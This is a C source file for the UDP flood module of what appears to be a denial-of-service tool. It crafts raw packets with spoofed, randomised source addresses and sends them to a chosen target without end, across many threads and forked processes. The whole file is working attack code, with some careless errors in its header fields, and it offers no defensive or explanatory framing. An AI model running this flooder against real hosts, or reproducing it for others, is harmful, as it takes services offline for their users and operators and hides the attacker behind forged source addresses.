#include <stdio.h> // printf/fprintf
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <signal.h>

#include <netinet/ip.h>  // struct ip
#include <sys/socket.h>  // socket()
#include <netinet/in.h>  // struct sockadd
#include <netinet/udp.h> // struct udp
#include <arpa/inet.h>

#include "../main.h"
#include "attack_udp_flood_dos.h"

// from ../core/core_log.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

static unsigned short CalculateSum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

static int SendUDP(const pUDPStruct us, const int debug_level)
{

    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
    {
        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DisplayWarning("This program should run as root user");
        }
        else if (errno == 24)
        {
            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }

    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    // dst
    sin.sin_port = htons((int)us->dst_port);
    sin.sin_addr.s_addr = inet_addr(us->dst_ip);

    struct ip *iph;
    struct udphdr *udp;
    char *datagram, *data;

    int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PADDING_SIZE;
    datagram = (char *)malloc(pksize);
    iph = (struct ip *)datagram;
    udp = (struct udphdr *)(datagram + sizeof(struct ip));
    data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));

    memset(datagram, 0, pksize);
    memcpy((char *)data, "x", PADDING_SIZE);

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        DisplayError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    //entete ip
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(pksize);
    iph->ip_ttl = 255;
    iph->ip_off = 0;
    iph->ip_id = sizeof(45);
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(us->src_ip);
    iph->ip_dst.s_addr = inet_addr(us->dst_ip);

    //entete udp

    udp->uh_sport = htons(us->src_port);
    udp->uh_dport = htons(us->dst_port);
    udp->uh_ulen = htons(sizeof(struct udphdr) + PADDING_SIZE);
    udp->uh_sum = CalculateSum((unsigned short *)udp, sizeof(struct udphdr) + PADDING_SIZE);

    // envoi
    int i;
    for (i = 0; i < us->loop; i++)
    {
        if (sendto(
                socket_fd,
                datagram,
                pksize,
                0,
                (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) < 0)
        {
            DisplayError("Attack send failed");
        }
    }

    //libere la memoire
    free(datagram);
    close(socket_fd);
    return 0;
}

static void FreeUDPStrutBuff(pUDPStruct input)
{
    // free
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int AttackThread(const pInput input)
{
    // here is udp flood thread
    extern void FreeSplitURLBuff(pSplitURLOutput p);
    extern int SplitURL(const char *url, pSplitURLOutput *output);
    extern void FreeRandomIPBuff(char *p);
    extern char *GetRandomIP(char **output);
    extern int GetRandomPort(int *output);

    pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
    pSplitURLOutput split_result;
    int i;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("SYNFloodAttack_Thread SplitURL failed");
        return 1;
    }
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("SYNFloodAttack_Thread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = SYN_FLOOD_PORT_DEFAULT;
    }
    // init the target ip and port
    udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(udp_struct->dst_ip))
    {
        DisplayError("SYNFloodAttack_Thread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("SYNFloodAttack_Thread memset failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
    {
        DisplayError("SYNFloodAttack_Thread strncpy failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    udp_struct->dst_port = split_result->port;
    FreeSplitURLBuff(split_result);
    udp_struct->loop = input->each_ip_repeat;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack_Thread start sending data...");
    for (;;)
    {
        // here get the random ip address and port
        if (input->random_sip_address == ENABLE_SIP)
        {
            if (!GetRandomIP(&(udp_struct->src_ip)))
            {
                DisplayError("SYNFloodAttack_Thread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(udp_struct->src_port));
        }
        // here we will use the default ip address and port
        else
        {
            if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
            {
                DisplayError("SYNFloodAttack_Thread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                return 1;
            }
            udp_struct->src_port = (int)DEFAULT_PORT;
        }

        // rport is random source port
        for (i = 0; i < input->each_ip_repeat; i++)
        {
            if (SendUDP(udp_struct, input->debug_level))
            {
                DisplayError("SYNFloodAttack_Thread Attack failed");
                return 1;
            }
        }
        FreeRandomIPBuff(udp_struct->src_ip);
    }
    FreeUDPStrutBuff(udp_struct);
    return 0;
}

int StartUDPFloodAttack(const pInput input)
{
    // run function in thread
    // this attack type must run as root

    pid_t pid, wpid;
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int i, j, ret;
    int status = 0;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");

    extern void SignalExit(int signo);
    signal(SIGINT, SignalExit);
    // unlimit loop
    for (;;)
    {
        // only one process
        if (input->max_process <= 1)
        {
            for (j = 0; j < input->max_thread; j++)
            {
                //input->serial_num = (i * input->max_thread) + j;
                if (pthread_attr_init(&attr))
                {
                    DisplayError("StartSYNFlood pthread_attr_init failed");
                    return 1;
                }
                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                {
                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                    return 1;
                }
                // create thread
                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
                //printf("j is: %d\n", j);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                // here we make a map
                if (ret != 0)
                {
                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                    DisplayError("Create pthread failed");
                    return 1;
                }
                pthread_attr_destroy(&attr);
            }
            //pthread_detach(tid);
            // join them all
            for (j = 0; j < input->max_thread; j++)
            {
                pthread_join(tid[j], NULL);
            }
        }
        else
        {
            // muti process
            for (i = 0; i < input->max_process; i++)
            {
                pid = fork();
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
                if (pid == 0)
                {
                    // child process
                    for (j = 0; j < input->max_thread; j++)
                    {
                        //input->serial_num = (i * input->max_thread) + j;
                        if (pthread_attr_init(&attr))
                        {
                            DisplayError("StartSYNFlood pthread_attr_init failed");
                            return 1;
                        }
                        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                        {
                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                            return 1;
                        }
                        // create thread
                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
                        //printf("j is: %d\n", j);
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                        // here we make a map
                        if (ret != 0)
                        {
                            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                            DisplayError("Create pthread failed");
                            return 1;
                        }
                        pthread_attr_destroy(&attr);
                    }
                    //pthread_detach(tid);
                    // join them all
                    for (j = 0; j < input->max_thread; j++)
                    {
                        pthread_join(tid[j], NULL);
                    }
                }
                else if (pid < 0)
                {
                    DisplayError("Create process failed");
                }
                // Father process
                while ((wpid = wait(&status)) > 0)
                {
                    // nothing here
                    // wait the child process end
                }
            }
        }
    }
    return 0;
}

int StartUDPFloodTest(const pInput input)
{
    // for test
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartUDPFloodTest");
    AttackThread(input);
    return 0;
}
